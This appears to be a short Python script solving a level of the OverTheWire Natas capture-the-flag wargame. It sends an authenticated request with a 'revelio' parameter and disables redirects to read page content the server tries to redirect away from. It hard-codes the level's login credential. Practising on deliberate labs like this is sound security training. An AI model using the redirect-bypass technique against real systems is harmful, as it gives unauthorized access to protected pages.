import requests

url="http://natas22.natas.labs.overthewire.org/?revelio=1"
auth_user="natas22"
auth_pass="91awVM9oDiUGm33JdzM7RVLBS8bz9n0s"
s= requests.Session()
r= s.get(url,auth=(auth_user,auth_pass),allow_redirects=False)
print(r.text)
